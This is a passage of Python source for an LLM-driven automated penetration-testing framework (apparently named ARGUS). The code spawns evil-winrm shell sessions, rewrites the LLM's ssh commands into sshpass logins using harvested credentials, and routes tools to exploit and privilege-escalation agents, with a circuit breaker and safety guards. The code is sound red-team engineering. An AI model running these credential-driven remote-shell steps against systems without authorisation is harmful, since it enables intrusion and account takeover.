        rhost    = m_target.group(1) if m_target else (self._target or "")
        ruser    = m_user.group(1)   if m_user   else "unknown"
        # Strip surrounding quotes the LLM sometimes adds
        ruser = ruser.strip("'\"")

        # Build argv — split args on whitespace honouring single-quoted strings
        argv: list = ["evil-winrm"]
        # tokenise — re.findall with shlex-equivalent pattern
        for tok in _re.findall(r"'[^']*'|\"[^\"]*\"|\S+", args or ""):
            argv.append(tok.strip("'\""))

        # Buffer chunks coming out of the PTY so we can detect the prompt
        chunks: list = []

        async def _on_output(_shell_id, _data):
            chunks.append(_data)
            # Mirror to broadcast through the agent's normal hook
            try:
                if shell_agent and hasattr(shell_agent, "_on_pty_output"):
                    await shell_agent._on_pty_output(_shell_id, _data)
            except Exception:
                pass

        pty = PtyShell(shell_id, _on_output)
        spawned = await pty.spawn(argv)
        if not spawned:
            return {
                "stdout":    "".join(chunks),
                "stderr":    "evil-winrm PTY spawn failed (binary missing or argv invalid)",
                "exit_code": 127,
                "tool":      "evil-winrm",
                "args":      args,
            }
        # Track the session in ShellAgent so subsequent shell_exec calls
        # find it via intel['shells']
        try:
            shell_agent._shells[shell_id] = pty
        except Exception:
            pass

        # Wait for the evil-winrm welcome prompt — patterns the tool emits
        # when authentication has succeeded and the PS prompt is up.
        prompt_re = _re.compile(
            r"(?:\*Evil-WinRM\*\s*PS|"
            r"PS\s+[A-Z]:\\[^\n]*>|"
            r"Info: Establishing connection to remote endpoint)",
            _re.I,
        )
        deadline = _time.monotonic() + max(15, int(timeout))
        success = False
        auth_failed = False
        while _time.monotonic() < deadline:
            blob = "".join(chunks)
            if prompt_re.search(blob):
                success = True
                break
            # Common failure patterns — bail early so we don't burn the timeout
            if _re.search(r"(?:WinRMAuthorizationError|"
                          r"Error: An error of type.*has occurred|"
                          r"Could not connect|"
                          r"Access is denied|"
                          r"401\s+Unauthorized)", blob, _re.I):
                auth_failed = True
                break
            await _asyncio.sleep(0.5)

        full_output = "".join(chunks)

        if success:
            # B11 — Real foothold!  Register with confirmed=True and an
            # evidence string that contains the prompt regex so the
            # auto-downgrade in register_shell keeps it confirmed.
            try:
                await self.register_shell(
                    source     = "evil-winrm:primer",
                    user       = ruser,
                    host       = rhost,
                    method     = "evil-winrm",
                    evidence   = full_output[-1500:],
                    session_id = shell_id,
                    rhost      = rhost,
                    rport      = 5985,
                    confirmed  = True,
                )
            except Exception as exc:
                import logging as _l
                _l.getLogger(__name__).warning(
                    "evil-winrm register_shell failed: %s", exc
                )
            return {
                "stdout":    full_output,
                "stderr":    "",
                "exit_code": 0,
                "tool":      "evil-winrm",
                "args":      args,
                "shell_id":  shell_id,
                "foothold":  True,
            }

        # Auth failed or timed out — kill the spawned process and report
        try:
            pty.terminate()
        except Exception:
            pass
        try:
            shell_agent._shells.pop(shell_id, None)
        except Exception:
            pass

        return {
            "stdout":    full_output,
            "stderr":    "evil-winrm authentication failed" if auth_failed else
                         f"evil-winrm prompt did not appear within {timeout}s",
            "exit_code": 1 if auth_failed else 124,
            "tool":      "evil-winrm",
            "args":      args,
            "shell_id":  shell_id,
            "foothold":  False,
        }

    def _normalize_action_args(self, tool: str, args: str) -> Tuple[str, str]:
        """B8 + B12 — Pre-dispatch action arg rewriter.

        The LLM frequently emits commands with placeholder values
        (`-d domain.local`) or missing prerequisites (bare `ssh user@host`
        with no password / BatchMode flag, which then hangs and times out).
        This helper performs targeted, conservative rewrites BEFORE the
        action reaches MCP so the dispatched command actually has a chance
        to succeed.

        Conservative on purpose: rewrites only happen when intel actually
        carries the right data.  When intel doesn't have the data, the args
        are returned unchanged.
        """
        import re as _re
        tool_l = (tool or "").lower()
        a = (args or "").strip()

        # ── B8: SSH bare-form rewrite ────────────────────────────────
        # Bare `ssh user@host` (no -i key, no sshpass wrapper) hangs
        # forever waiting for password prompt.  Rewrite using the first
        # credential in intel['credentials'] when its user matches.
        if tool_l == "ssh":
            # Match either bare `user@host` or `-p N user@host` etc.
            user_at = _re.search(r"(\b[A-Za-z_][\w.-]*)@([A-Za-z0-9._-]+)", a)
            if user_at:
                u_proposed = user_at.group(1)
                h_proposed = user_at.group(2)
                # Find a matching credential
                creds = self._intel.get("credentials") or []
                pwd = None
                for c in creds:
                    if not isinstance(c, dict):
                        continue
                    if (c.get("user") or "").lower() == u_proposed.lower():
                        pwd = c.get("password") or c.get("pass")
                        if pwd:
                            break
                # Also try operator_notes scan via decision_engine extractor
                if not pwd:
                    try:
                        from agents.reasoning.decision_engine import DecisionEngine
                        creds_extracted = DecisionEngine._extract_credentials(self._intel)
                        if creds_extracted and (creds_extracted.get("user") or "").lower() == u_proposed.lower():
                            pwd = creds_extracted.get("pass")
                    except Exception:
                        pass

                if pwd:
                    # Build a non-interactive SSH command
                    safe_pwd = pwd.replace("'", "'\"'\"'")  # escape single quotes
                    new_args = (
                        f"-p '{safe_pwd}' ssh -o StrictHostKeyChecking=no "
                        f"-o BatchMode=no -o ConnectTimeout=10 "
                        f"-o PreferredAuthentications=password -o PubkeyAuthentication=no "
                        f"{u_proposed}@{h_proposed} 'id; whoami; hostname; uname -a 2>/dev/null'"
                    )
                    import logging as _l
                    _l.getLogger(__name__).info(
                        "[normalize] B8 ssh→sshpass rewrite for %s@%s (creds available)",
                        u_proposed, h_proposed,
                    )
                    return "sshpass", new_args
                # No creds found — at least add BatchMode so it fails fast
                # instead of hanging on the password prompt.
                if "BatchMode" not in a and "-i " not in a:
                    new_args = "-o BatchMode=yes -o ConnectTimeout=10 " + a
                    import logging as _l
                    _l.getLogger(__name__).info(
                        "[normalize] B8 ssh +BatchMode (no creds found for %s)", u_proposed
                    )
                    return tool, new_args

        # ── B12: bloodhound-python placeholder rewrite ───────────────
        # The LLM frequently emits `-d domain.local` instead of using the
        # actual discovered domain.  Replace with intel-resolved value.
        if tool_l in ("bloodhound-python", "bloodhound", "bloodhound-ce-python"):
            real_domain = (
                (self._intel.get("domain") or "").strip()
                or (self._intel.get("ad", {}).get("dns_domain") or "").strip()
                if isinstance(self._intel.get("ad"), dict)
                else ""
            )
            if real_domain:
                placeholder_pattern = _re.compile(
                    r"-d\s+(?:domain\.local|example\.com|target\.local|"
                    r"corp\.local|local|placeholder|TARGET_DOMAIN|<domain>|DOMAIN)",
                    _re.I,
                )
                if placeholder_pattern.search(a):
                    new_args = placeholder_pattern.sub(f"-d {real_domain}", a)
                    import logging as _l
                    _l.getLogger(__name__).info(
                        "[normalize] B12 bloodhound -d <placeholder> → -d %s",
                        real_domain,
                    )
                    return tool, new_args
                # Also catch the case where -d is present but the value is
                # the LITERAL string "domain" with no dot — also a placeholder.
                bare_d = _re.search(r"-d\s+(\S+)", a)
                if bare_d and "." not in bare_d.group(1) and bare_d.group(1).lower() in (
                    "domain", "target", "host", "ad", "active-directory"
                ):
                    new_args = a.replace(bare_d.group(0), f"-d {real_domain}", 1)
                    import logging as _l
                    _l.getLogger(__name__).info(
                        "[normalize] B12 bloodhound -d %s → -d %s",
                        bare_d.group(1), real_domain,
                    )
                    return tool, new_args

        return tool, args

    async def _dispatch_to_agent(
        self,
        tool:    str,
        args:    str,
        purpose: str,
        phase:   str,
        timeout: int = 300,
    ) -> dict:
        """
        Route a single tool execution through the appropriate specialist agent.
        This ensures ALL agent events (tool_start, tool_output, finding,
        graph_node, graph_edge) flow to the frontend dashboards exactly as
        they do during normal phase execution.

        Returns a dict with: stdout, stderr, exit_code, output_id.
        """
        # When a primer emits the synthetic "shell_exec" tool name, that
        # means "run this command inside an existing PTY session on the
        # target" — NOT "spawn it on the operator host via MCP".  Route
        # through the active shell session instead.
        if tool == "shell_exec":
            return await self._dispatch_active_shell_command(
                command = args, purpose = purpose, timeout = timeout,
            )

        # B11 — evil-winrm is interactive PTY-only.  Spawning it via MCP
        # produces a process that hangs at the prompt and times out, so
        # the credentialed-AD primer chain's #4 step never registered
        # a foothold even when the credentials were valid.  Route it
        # through ShellAgent.create_listener-style PTY spawn so the
        # `*Evil-WinRM* PS C:\>` prompt is captured, the session lives
        # for follow-up commands, and register_shell trips properly.
        if tool in ("evil-winrm", "evilwinrm"):
            return await self._dispatch_evil_winrm(
                args = args, purpose = purpose, timeout = timeout,
            )

        # B8 / B12 — Pre-dispatch normalization.  When the LLM proposes a
        # tool with placeholder / unsafe args, rewrite the args using known
        # intel BEFORE the action reaches MCP.  Two fixes:
        #   B8:  bare `ssh user@host` (no creds) → sshpass + password
        #         from intel['credentials'] + BatchMode=yes so it doesn't
        #         hang waiting for an interactive prompt.
        #   B12: bloodhound-python `-d domain.local` placeholder → real
        #         domain from intel['domain'] / intel['ad']['dns_domain'].
        tool, args = self._normalize_action_args(tool, args)

        # ── CIRCUIT BREAKER ──────────────────────────────────────
        # Prevents the "486 curl calls / 0 findings" pathology seen on
        # 10.129.56.165.  Tracks (tool, target_prefix) pairs and the
        # number of consecutive empty/error invocations.  When that count
        # exceeds a per-tool threshold, blocks further calls of the same
        # pair until the LLM does something different (different tool,
        # different target, or a finding lands).  Forces the agent to
        # pivot instead of cycling.
        cb_key = (tool, (args or "").split()[0] if args else self._target)
        breaker = getattr(self, "_tool_circuit_breaker", None)
        if breaker is None:
            # {(tool, target_prefix): {"consecutive_empty": int, "blocked": bool}}
            breaker = {}
            self._tool_circuit_breaker = breaker
        cb_state = breaker.get(cb_key, {"consecutive_empty": 0, "blocked": False})
        # Per-tool thresholds — strict for known fuzz/spray tools that
        # generate lots of noise per call, lenient for targeted tools.
        cb_thresholds = {
            "curl":       6,   # curl flood was the worst offender (486 calls)
            "gobuster":   3,
            "ffuf":       3,
            "wfuzz":      3,
            "dirb":       3,
            "feroxbuster": 3,
            "wafw00f":    2,
            "whatweb":    3,
            "dalfox":     2,
            "commix":     2,
            "davtest":    2,
            "sqlmap":     3,
            "nuclei":     4,
        }
        cb_limit = cb_thresholds.get(tool.lower(), 5)
        if cb_state["consecutive_empty"] >= cb_limit:
            cb_state["blocked"] = True
            breaker[cb_key] = cb_state
            await self.emit_reasoning(
                step      = "circuit_breaker_trip",
                reasoning = (f"{tool} against {cb_key[1]} has produced "
                              f"{cb_state['consecutive_empty']} consecutive "
                              f"empty/error results.  Blocking further calls "
                              f"of this pair to force a pivot."),
                decision  = f"CIRCUIT-BREAKER tripped on ({tool}, {cb_key[1]})",
                next_action = ("LLM must choose a different tool, a different "
                                "target, or pivot phase based on existing intel"),
            )
            return {
                "stdout": "", "stderr":
                    f"[circuit-breaker] {tool} blocked after "
                    f"{cb_state['consecutive_empty']} unproductive calls. "
                    f"Pivot to a different action.",
                "exit_code": -2, "output_id": "",
                "tool": tool, "args": args, "findings": [],
                "circuit_breaker": True,
            }

        # ── OPERATOR FAST PATH (speed) ───────────────────────────────────────
        # When the operator core dispatches a tool it reads the raw output
        # itself, so run the tool DIRECTLY via run_tool — NO specialist/cluster
        # agent spin-up and NO per-tool "extract findings" LLM call (that tax was
        # ~40% of all LLM calls in the logs).  This also makes every specialist +
        # specialist-cluster agent (cloud/container/iot/wireless/evasion/
        # forensics/traffic) fallback-only — they no longer fire on the operator
        # path.  run_tool keeps every safety guard (hosts-guard, blacklist,
        # OPSEC) + GUI streaming.  Cheap LLM-free recon enrichment + dedup of
        # expensive scans (the 4-6× nmap -p- problem) ride along.
        if phase == "operator":
            _DEDUP_TOOLS = frozenset({
                "nmap", "rustscan", "masscan", "gobuster", "ffuf", "feroxbuster",
                "dirb", "dirsearch", "wfuzz", "nikto", "nuclei", "whatweb",
            })
            cache = self._intel.setdefault("_tool_cache", {})
            ckey = f"{tool}::{args}"
            if tool.lower() in _DEDUP_TOOLS and ckey in cache:
                cached = dict(cache[ckey]); cached["cached"] = True
                return cached
            res = await self.run_tool(tool, args or self._target,
                                      target=self._target, timeout=timeout)
            out = {
                "stdout":    (res.get("stdout") or "")[:65536],
                "stderr":    res.get("stderr", ""),
                "exit_code": res.get("exit_code", 0),
                "output_id": res.get("output_id", ""),
                "tool":      tool, "args": args,
            }
            try:
                self._cheap_intel_merge(tool, out["stdout"])
            except Exception:
                pass
            self._record_dispatch_outcome(
                cb_key, productive=bool(out["stdout"] and out["exit_code"] == 0))
            if (tool.lower() in _DEDUP_TOOLS and out["exit_code"] == 0
                    and out["stdout"]):
                cache[ckey] = out
            return out

        agent_type = self._classify_tool_to_phase(tool)
        task = {
            "tool":         tool,
            "args":         args or self._target,
            "purpose":      purpose or f"Reasoning engine: {tool}",
            "timeout":      timeout,
            "can_parallel": False,
        }

        # Each branch below returns a result dict.  The exception handler
        # at the end of this method tracks failures via the circuit
        # breaker.  Successful (productive) calls are tracked by the
        # caller via _record_dispatch_outcome in the post-dispatch hook
        # of the LLM reasoning loop — which sees the final result dict
        # and can distinguish "produced findings" from "stdout was empty".
        try:
            if agent_type == "recon":
                from agents.recon_agent import ReconAgent
                agent_obj = ReconAgent(broadcast=self.broadcast)
                agent_obj._session_id = self._session_id
                result = await agent_obj.execute_tasks(
                    self._target, [task], "RECON", self._intel
                )
                # Merge recon findings into intel
                for key in ("open_ports", "services", "os_guess", "web_paths",
                            "technologies", "domain_info", "web_targets"):
                    if result.get(key) is not None:
                        self._intel[key] = result[key]
                return {
                    "stdout":    str(result.get("raw_output", result))[:65536],
                    "stderr":    "",
                    "exit_code": 0,
                    "output_id": "",
                    "tool":      tool,
                    "args":      args,
                    "findings":  result.get("findings", []),
                }

            elif agent_type == "vuln":
                from agents.vuln_agent import VulnAgent
                agent_obj = VulnAgent(broadcast=self.broadcast)
                agent_obj._session_id = self._session_id
                result = await agent_obj.execute_tasks(
                    self._target, [task], "VULN_ID", self._intel
                )
                for key in ("vulnerabilities", "cves", "exploits"):
                    if result.get(key) is not None:
                        existing = self._intel.get(key, [])
                        if isinstance(result[key], list):
                            # Deduplicate by converting dicts to frozensets for set operations
                            merged = list(existing)
                            existing_strs = {str(e) for e in existing}
                            for item in result[key]:
                                if str(item) not in existing_strs:
                                    merged.append(item)
                            self._intel[key] = merged
                        else:
                            self._intel[key] = result[key]
                return {
                    "stdout":    str(result.get("raw_output", result))[:65536],
                    "stderr":    "",
                    "exit_code": 0,
                    "output_id": "",
                    "tool":      tool,
                    "args":      args,
                }

            elif agent_type == "web":
                from agents.web_agent import WebAgent
                agent_obj = WebAgent(broadcast=self.broadcast)
                agent_obj._session_id = self._session_id
                result = await agent_obj.execute_tasks(
                    self._target, [task], "WEB_TESTING", self._intel
                )
                for key in ("web_vulns", "web_paths", "web_targets", "paths",
                            "technologies", "interesting_files", "credentials"):
                    if result.get(key) is not None:
                        existing = self._intel.get(key, [])
                        if isinstance(result[key], list) and isinstance(existing, list):
                            merged = list(existing)
                            existing_strs = {str(e) for e in existing}
                            for item in result[key]:
                                if str(item) not in existing_strs:
                                    merged.append(item)
                            self._intel[key] = merged
                        else:
                            self._intel[key] = result[key]
                return {
                    "stdout":    str(result.get("raw_output", result))[:65536],
                    "stderr":    "",
                    "exit_code": 0,
                    "output_id": "",
                    "tool":      tool,
                    "args":      args,
                }

            elif agent_type == "exploit":
                from agents.exploit_agent import ExploitAgent
                agent_obj = ExploitAgent(broadcast=self.broadcast)
                agent_obj._session_id = self._session_id
                result = await agent_obj.execute_tasks(
                    self._target, [task], "EXPLOITATION", self._intel
                )
                for key in ("shells", "credentials", "shell_access"):
                    if result.get(key) is not None:
                        self._intel[key] = result[key]
                return {
                    "stdout":    str(result.get("raw_output", result))[:65536],
                    "stderr":    "",
                    "exit_code": 0 if result.get("shell_access") else 1,
                    "output_id": "",
                    "tool":      tool,
                    "args":      args,
                }

            elif agent_type == "privesc":
                from agents.privesc_agent import PrivescAgent
                agent_obj = PrivescAgent(broadcast=self.broadcast)
                agent_obj._session_id = self._session_id
                result = await agent_obj.execute_tasks(
                    self._target, [task], "PRIVILEGE_ESCALATION", self._intel
                )
                for key in ("current_user", "root_flag", "elevated_shell"):
                    if result.get(key) is not None:
                        self._intel[key] = result[key]
                return {
                    "stdout":    str(result.get("raw_output", result))[:65536],
                    "stderr":    "",
                    "exit_code": 0 if result.get("elevated_shell") else 1,
                    "output_id": "",
                    "tool":      tool,
                    "args":      args,
                }

            else:
                # Generic fallback — route via recon agent (most tools are recon-adjacent)
                from agents.recon_agent import ReconAgent
                agent_obj = ReconAgent(broadcast=self.broadcast)
                agent_obj._session_id = self._session_id
                result = await agent_obj.execute_tasks(
                    self._target, [task], phase or "RECON", self._intel
                )
                return {
                    "stdout":    str(result.get("raw_output", result))[:65536],
                    "stderr":    "",
                    "exit_code": 0,
                    "output_id": "",
                    "tool":      tool,
                    "args":      args,
                }

        except Exception as e:
            import logging as _log
            _log.getLogger(__name__).warning("_dispatch_to_agent error (%s): %s", tool, e)
            # Circuit breaker: errors count as unproductive too
            self._record_dispatch_outcome(cb_key, productive=False)
            return {
                "stdout":    "",
                "stderr":    str(e),
                "exit_code": -1,
                "output_id": "",
                "error":     str(e),
            }

    def _cheap_intel_merge(self, tool: str, stdout: str) -> None:
        """LLM-free intel enrichment for the operator fast path.

        Parses nmap/rustscan-style open-port + service/version lines into
        intel['open_ports'] and intel['services'] so the GUI, the operator brief,
        and the CVE auto-seed still populate — WITHOUT the per-tool 'extract
        findings' LLM call.  Pure regex; never raises into the caller."""
        if not stdout:
            return
        import re as _re
        tl = (tool or "").lower()
        if tl in ("nmap", "rustscan", "masscan"):
            ports = self._intel.setdefault("open_ports", [])
            svcs = self._intel.setdefault("services", {})
            have = {str(p.get("port") if isinstance(p, dict) else p) for p in ports}
            for m in _re.finditer(
                    r"(?m)^(\d{1,5})/tcp\s+open\s+(\S+)(?:\s+(.*))?$", stdout):
                pn, svc, ver = m.group(1), m.group(2), (m.group(3) or "").strip()
                if pn not in have:
                    ports.append({"port": int(pn), "service": svc, "version": ver})
                    have.add(pn)
                svcs[pn] = {"service": svc, "version": ver,
                            "protocol": "tcp", "port": int(pn)}
        # Capability-module recon fingerprint (Crestron AV/OT today; the seed of
        # the OT/IoT/IT registry, sub-project #5) — best-effort, never raises.
        self._avot_capability_scan()
        # Real-time latest-vulnerability lookup (client feedback #5): the moment a
        # service+version is identified, hand it to the OSINT intel-cascade so the
        # latest-CVE/exploit lookups (NVD CPE → Vulners → CISA-KEV → ExploitDB →
        # GitHub-PoC) fire NOW, not only at the later OSINT phase.  The cascade
        # de-duplicates signals, so repeated merges are cheap.  Best-effort.
        self._realtime_cve_lookup()

    # Capability-module registry: each module exposes detect(intel) -> dict |
    # list[dict] | None and finding_for(det) -> store_finding-shaped record.
    # agents/avot = Crestron AV/OT; agents/ai_red_team/discovery = shadow-AI
    # surfaces.  Seed of the broader OT/IoT/IT registry (sub-project #5).
    _CAPABILITY_MODULES = ("agents.avot.recon", "agents.ai_red_team.discovery",
                           "agents.ot.modbus", "agents.ot.opcua", "agents.ot.bacnet")

    def _realtime_cve_lookup(self) -> None:
        """Client feedback #5 — prove ARGUS hunts the LATEST vulnerabilities for
        whatever technology it identifies, in real time.  As soon as recon merges
        a service+version into intel, push those signals into the per-session
        OSINT intel-cascade so its latest-CVE / public-exploit subagents (NVD CPE,
        Vulners, CISA-KEV, ExploitDB, GitHub-PoC) run immediately instead of only
        at the dedicated OSINT phase.  The cascade de-duplicates by signal token,
        so calling this on every merge is cheap and idempotent.  Best-effort —
        any failure (no cascade yet, import error) is swallowed so recon is never
        blocked.  Emits a lightweight event the first time a tech is queued so the
        operator can SEE the lookup happening in the live feed."""
        try:
            from agents.osint.intel_cascade import get_cascade
        except Exception:
            return
        sid = getattr(self, "_session_id", None) or getattr(self, "session_id", None)
        if not sid:
            return
        try:
            casc = get_cascade(str(sid))
        except Exception:
            casc = None
        if casc is None:
            return
        intel = getattr(self, "_intel", None) or {}
        # Only the technology-bearing slices — never hosts/IPs (target-agnostic).
        payload = {
            "services":        intel.get("services") or {},
            "open_ports":      intel.get("open_ports") or [],
            "cves_with_score": intel.get("cves_with_score"),
            "critical_cves":   intel.get("critical_cves"),
            "technologies":    intel.get("technologies") or intel.get("tech") or [],
            "hostnames":       intel.get("hostnames") or [],
        }
        try:
            n = casc.harvest_signals_from_intel(payload)
        except Exception:
            n = 0
        # Surface the FIRST time each technology batch is queued so the user can
        # confirm in the feed that latest-CVE hunting is actually firing.
        try:
            if n and not getattr(self, "_realtime_cve_announced", False):
                self._realtime_cve_announced = True
                svc_names = sorted({
                    (v or {}).get("service", "") for v in (payload["services"] or {}).values()
                    if (v or {}).get("service")
                })[:8]
                self._create_task(self._emit("intel_cascade_status", {
                    "status":  "querying",
                    "message": ("🌐 Latest-CVE lookup queued for identified tech: "
                                + (", ".join(svc_names) if svc_names else f"{n} signal(s)")),
                    "signals": int(n),
                }))
        except Exception:
            pass

    def _avot_capability_scan(self) -> None:
        """Ask every registered capability module whether the current intel
        matches its technology.  On a match: record a finding ONCE via the
        standard pipeline and inject an operator guidance note so the LLM knows
        the capability exists.  All technology specifics live in the capability
        modules — the engine stays content-agnostic.  ``detect`` may return a
        single dict or a list (e.g. several shadow-AI surfaces on one host).
        Best-effort; never raises into the caller."""
        # One-time RAG ingest of the human-authored skill bodies (sub-project #5).
        self._ingest_skills_to_rag()
        # Passive-first OT (GRASSMARLIN doctrine, #5 Slice 2): if a PCAP/SPAN
        # capture was supplied, merge its observed services into intel BEFORE any
        # active probe so fragile OT is characterised with zero packets sent.
        self._merge_passive_capture()
        import importlib as _il
        for _modname in self._CAPABILITY_MODULES:
            try:
                _mod = _il.import_module(_modname)
                det = _mod.detect(self._intel)
            except Exception:
                continue
            if not det:
                continue
            for d in (det if isinstance(det, list) else [det]):
                if isinstance(d, dict):
                    self._record_capability_detection(_mod, d)
        # Data-driven skill registry (sub-project #5): match human-authored skill
        # files against intel.  Record findings (dedup), then PRIORITISE the matches
        # (#2), record telemetry (#5), and gated-auto-dispatch the top safe quick-wins
        # (#3).  The self-learning loop closes at engagement end (skill_telemetry).
        try:
            from knowledge import skill_registry as _sr
            _skill_dets = _sr.match_skills(self._intel)
            for _d in _skill_dets:
                self._record_capability_detection(_sr, _d, advise=False)
            self._capability_skill_followup(_skill_dets)
        except Exception:
            pass

    def _ingest_skills_to_rag(self) -> None:
        """Best-effort: ingest the skill-file guidance bodies into RAG once per
        process so the operator can also retrieve them semantically.  Behind
        ARGUS_SKILL_REGISTRY (default-on); idempotent via a flag."""
        import os as _os
        if _os.environ.get("ARGUS_SKILL_REGISTRY", "1") == "0":
            return
        if getattr(self, "_skills_ingested", False):
            return
        self._skills_ingested = True
        try:
            from knowledge import skill_registry as _sr
            for _s in _sr.load_skills():
                _sr.ingest_to_rag(_s)
        except Exception:
            pass

    def _merge_passive_capture(self) -> None:
        """Best-effort passive-first OT: merge a supplied PCAP/SPAN capture's
        observed ports/services into intel (zero packets sent).  Idempotent;
        no-op when no pcap_path is configured or scapy is unavailable."""
        path = self._intel.get("pcap_path")
        if not path or getattr(self, "_passive_merged", False):
            return
        self._passive_merged = True
        try:
            from agents.ot import passive_ingest as _pi
            observed = _pi.ingest_pcap(str(path))
            if not observed:
                return
            ports = self._intel.setdefault("open_ports", [])
            have = {str(p.get("port") if isinstance(p, dict) else p) for p in ports}
            for op in observed.get("open_ports", []):
                if str(op.get("port")) not in have:
                    ports.append(op); have.add(str(op.get("port")))
            svcs = self._intel.setdefault("services", {})
            for k, v in (observed.get("services") or {}).items():
                svcs.setdefault(str(k), v)
            self._intel["passive_capture"] = True
        except Exception:
            pass

    def _record_capability_detection(self, mod, det: Dict, advise: bool = True) -> None:
        """Dedup + record a single capability detection (finding + operator note).
        ``advise=False`` suppresses the per-detection note (skill matches use the
        prioritised block in _capability_skill_followup instead, to avoid noise)."""
        tech = det.get("technology", "")
        seen = self._intel.setdefault("_capability_detected", [])
        if tech in seen:
            return
        seen.append(tech)
        # Operator guidance (best-effort) so the LLM can use the capability.
        if advise:
            try:
                self._meta_advisory_context.append(
                    f"{tech} detected ({det.get('evidence','')}). {det.get('hint','')}".strip())
            except Exception:
                pass
        # Record a finding through the standard pipeline (async, fire-and-forget).
        try:
            import asyncio as _a
            from db.schemas import FindingSeverity as _FS
            f = mod.finding_for(det)
            # A bare capability detection is an OBSERVATION → default INFO, never HIGH.
            _sev = getattr(_FS, str(f.get("severity", "info")).upper(), _FS.INFO)
            # Carry the inherent-risk class as metadata so prioritisation / the P1
            # remediation roadmap still rank SharePoint / Modbus / FADEC as high-VALUE
            # targets without inflating the finding's headline severity.
            _inh = f.get("inherent_risk") or det.get("inherent_risk") or det.get("severity")
            _a.ensure_future(self.store_finding(
                severity=_sev, title=f["title"], description=f["description"],
                host=str(self._intel.get("target_host") or self._intel.get("target") or ""),
                tool_used=f.get("tool_used", "capability"),
                evidence=f.get("evidence"), remediation=f.get("remediation"),
                extra=({"inherent_risk": str(_inh).lower()} if _inh else None),
                # Operational severity: a capability detection is an OBSERVATION →
                # the policy grades it INFO (evidence tag OBSERVED). inherent_risk
                # is carried for prioritisation only.
                signals={"detection_only": True,
                         "inherent_risk": (str(_inh).lower() if _inh else None)}))
        except Exception:
            pass

    def _capability_skill_followup(self, skill_dets: List[Dict]) -> None:
        """#5 telemetry + #2 prioritisation + #3 auto-dispatch for matched skills.
        Records which skills fired (for end-of-engagement learning), injects ONE
        prioritised, focused advisory (top-N, highest-yield first), and schedules
        the gated safe-quick-win auto-dispatch.  Best-effort; never raises."""
        if not skill_dets:
            return
        try:
            from knowledge import skill_registry as _sr
            from knowledge import skill_telemetry as _st
        except Exception:
            return
        # #5 — record every fired skill + remember it for the learning loop.
        fired = self._intel.setdefault("_fired_skills", [])
        for _d in skill_dets:
            _sid = str(_d.get("id", ""))
            if not _sid:
                continue
            try:
                _st.record_fired(_sid)
            except Exception:
                pass
            if _sid not in fired:
                fired.append(_sid)
        ceiling = str(self._intel.get("scan_intrusiveness") or "safe")
        domain = "OT" if any(_d.get("domain") == "OT" for _d in skill_dets) else "IT"
        # #2 — one prioritised, focused advisory so the operator does not drown.
        try:
            guidance = _sr.prioritized_guidance(skill_dets, ceiling=ceiling, domain=domain,
                                                authorized=False, top_n=6)
            if guidance:
                self._meta_advisory_context.append(
                    "PRIORITISED technology matches (highest-yield first; respect the "
                    f"scan-intrusiveness ceiling = {ceiling}):\n" + guidance)
        except Exception:
            pass
        # #3 — gated safe-quick-win auto-dispatch (default OFF).  Check the toggle
        # BEFORE creating the coroutine so the default path allocates nothing.
        import os as _os
        if _os.environ.get("ARGUS_SKILL_AUTODISPATCH", "0") == "1":
            try:
                self._create_task(self._capability_autodispatch(skill_dets, ceiling, domain))
            except Exception:
                pass

    async def _capability_autodispatch(self, skill_dets: List[Dict], ceiling: str,
                                       domain: str) -> None:
        """#3 — opt-in (ARGUS_SKILL_AUTODISPATCH=1): auto-run the top few SAFE
        quick-wins within the ceiling via run_tool, recording the outcome to
        telemetry (did the safe quick-win produce usable output?).  Only SAFE
        class, only enumeration the operator could run anyway; best-effort."""
        import os as _os
        if _os.environ.get("ARGUS_SKILL_AUTODISPATCH", "0") != "1":
            return
        try:
            from knowledge import skill_registry as _sr
            from knowledge import skill_telemetry as _st
        except Exception:
            return
        host = str(self._intel.get("target_host") or self._intel.get("target") or "")
        if not host:
            return
        for _d in _sr.rank_matches(skill_dets)[:3]:
            _sid = str(_d.get("id", ""))
            qws = _sr.safe_quick_wins(_d, ceiling, _d.get("domain", domain), authorized=False)
            if not qws:
                continue
            cmd = str(qws[0].get("cmd", "")).replace("{host}", host).strip()
            if not cmd or "{" in cmd:        # unresolved placeholder → skip
                continue
            tool = cmd.split()[0]
            args = cmd[len(tool):].strip()
            produced = False
            try:
                res = await self.run_tool(tool, args, target=host, timeout=120)
                out = (res or {}).get("stdout", "") or ""
                produced = bool(out.strip()) and int((res or {}).get("exit_code", 1) or 1) == 0
            except Exception:
                produced = False
            try:
                _st.record_quick_win(_sid, produced)
                await self._emit("skill_autodispatch",
                                 {"skill": _sid, "cmd": cmd[:200], "produced": produced})
            except Exception:
                pass

    def _record_dispatch_outcome(self, cb_key, *, productive: bool) -> None:
        """Update the circuit-breaker counter for a (tool, target) pair.

        productive=True   → reset the consecutive-empty counter (we
                             produced output or findings)
        productive=False  → increment (empty output, error, timeout)

        Called from _dispatch_to_agent's exception path and from the
        post-dispatch hook in the LLM reasoning loop.
        """
        breaker = getattr(self, "_tool_circuit_breaker", None)
        if breaker is None:
            self._tool_circuit_breaker = breaker = {}
        st = breaker.get(cb_key) or {"consecutive_empty": 0, "blocked": False}
        if productive:
            st["consecutive_empty"] = 0
            st["blocked"] = False
        else:
            st["consecutive_empty"] = st.get("consecutive_empty", 0) + 1
        breaker[cb_key] = st

    async def _check_pause_requested(self) -> bool:
        """Return True if the operator has requested a pause."""
        return not self._pause_event.is_set()

    async def _save_reasoning_checkpoint(self, iteration: int) -> None:
        """Save a checkpoint with reasoning engine state included."""
        try:
            # Merge reasoning state into intel before saving
            if self._reasoning_loop_inst:
                state = self._reasoning_loop_inst.serialize_state()
                self._intel.update(state)
            # Tag iteration in intel so it survives the checkpoint round-trip
            self._intel["reasoning_iteration"] = iteration
            await self._save_checkpoint("auto")
        except Exception:
            pass

    async def _teardown_runtime_resources(self) -> None:
        """B-3 / B-5 — Single teardown helper called from BOTH the
        complete path and the cancel path.  Releases:
          1. ListenerManager — kills all multi/handler / nc / ncat
             listeners and frees ports 4444-4474.
          2. ShellAgent PTYs — terminates any spawned evil-winrm /
             ssh / nc / socat shell processes that would otherwise
             keep running after the scan ends.
        Failures are logged at WARNING and never raised, so a partial
        teardown on a degraded system still completes the scan exit.
        """
        # ── Listener manager ─────────────────────────────────
        lm = getattr(self, "listener_manager", None)
        if lm is not None:
            try:
                await lm.shutdown()
            except Exception as _le:
                logger.warning("listener_manager shutdown failed: %s", _le)

        # ── Shell agent PTYs ─────────────────────────────────
        sa = getattr(self, "_shell_agent", None)
        if sa is not None and hasattr(sa, "_shells"):
            try:
